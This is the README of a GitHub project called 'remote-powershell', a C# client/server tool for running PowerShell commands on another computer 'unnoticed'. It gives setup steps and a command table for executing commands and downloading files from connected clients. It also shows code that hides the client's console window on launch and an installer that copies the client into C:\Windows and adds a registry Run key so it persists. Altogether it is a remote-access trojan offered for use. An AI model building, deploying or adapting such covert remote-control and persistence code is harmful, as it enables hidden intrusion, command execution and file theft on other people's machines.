# remote-powershell

It is a terminal-based application that allows you to execute commands on a remote computer in PowerShell unnoticed.

The application is divided into two main sections: client and server. And there are also special versions of sections that have additional functionality. Each of the sections and versions is briefly described below, as well as a short guide on how to set them up.

## server 

[Click to view](https://github.com/shead0shead/remote-powershell/tree/main/server)

The server folder contains all the files related to the part of the program that should be executed on the device from which the commands will be sent.

Just change the IP and Port to the one you need and run the program while waiting for connections.

```csharp
// Change IPAddress.Any (IP) and 8802 (Port) to the one you need
TcpListener tcpListener = new TcpListener(IPAddress.Any, 8802);
```

| Command           | Description                                                                  | Syntax                        | Aliases  |
| ----------------- | ---------------------------------------------------------------------------- | ----------------------------- | -------- |
| execute           | Sends and executes the command you specified on the remote client's computer | execute [client-id] [command] | exec, !  |
| download          | Downloads the file you specified from a remote client's computer             | download [client-id] [path]   | dload, + |
| connection list   | Gives a list of all active remote connections                                | connection list               |          |
| connection remove | Forcibly disconnects the specified remote client from the server             | connection remove [client-id] |          |
| clear             | Clears the terminal                                                          | clear                         | clr      |
| quit              | Closes the application                                                       | quit                          | exit     |

Despite the fact that the disconnect command forcibly disconnects the remote client from the server, the automatic reconnection function in the client can still restore connections after a while.

## client

[Click to view](https://github.com/shead0shead/remote-powershell/tree/main/client)

The client folder contains all the files related to the part of the program that should be executed on the device to which the commands will be sent and executed.

Just change the IP and Port to the ones you installed on the server and run the program on another device.

```csharp
string host = "127.0.0.1"; // Change 127.0.0.1 (IP) to the one you need
int port = 8802;           // Change 8802 (Port) to the one you need
```

If you don't want the application to be automatically hidden after launch, delete the code shown below.

```csharp
[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

const int SW_HIDE = 0;
const int SW_SHOW = 5;

var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);
```

You can also delete only the last line shown, this will also make the app visible after launch.

Please note that if you use services that will help you expand your local network, such as ngrok, then you may have problems reconnecting the client to the server after it is turned off, since the connection for the client will remain active.

## client-and-installer

[Click to view](https://github.com/shead0shead/remote-powershell/tree/main/client-and-installer)

Client-and-installer is a version of the application that, when launched, automatically installs the client on a remote computer and adds it to Windows Startup.

```csharp
// Instead of "C:\Windows\client.exe" enter the path where the hidden client will be installed
if (Environment.ProcessPath != @"C:\Windows\client.exe")
{
    // Instead of "C:\Windows\client.exe" enter the path where the hidden client will be installed
    string path = @"C:\Windows\client.exe";
    ...
}
```

Сlient-and-installer automatically adds the application to Windows startup, if you want to remove it, then go to the Program.cs file in the client-and-installer folder and remove all lines from 15th to 17th.

```csharp
// Autorun code
RegistryKey registry;
registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
registry.SetValue("client", @"C:\Windows\client.exe");
```